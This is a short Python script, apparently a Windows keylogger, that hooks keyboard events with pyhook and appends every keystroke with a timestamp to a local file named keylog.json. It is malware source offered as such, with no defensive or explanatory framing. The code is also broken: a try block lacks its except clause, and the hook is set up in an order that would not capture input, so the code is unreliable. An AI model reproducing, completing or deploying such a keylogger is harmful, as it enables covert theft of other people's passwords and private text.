 import pyhook, sys, os, datetime, json
from msvcrt import getch

class Keylogger:
    def __init__(self):
        self.hooks_created = False
        self.filename = "keylog.json"

    def hook_thread(self):
        while True:
            if not self.hooks_created:
                # Create a hook for keyboard input
                ih = pyhook.HookManager()
                ih.HookKeyboard()

                def OnKeyboardEvent(event):
                    try:
                        key = event.Ascii
                        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
                        data = { "key": chr(key), "time": timestamp }

                        # Add the event to our log file
                        with open(self.filename, 'a') as f:
                            json.dump(data, f)

                ih.HookedKeyDown += OnKeyboardEvent
                self.hooks_created = True

            else:
                # Listen for key events in a separate thread
                getch()

def main():
    k = Keylogger()
    k.hook_thread()

if __name__ == '__main__':
    main()

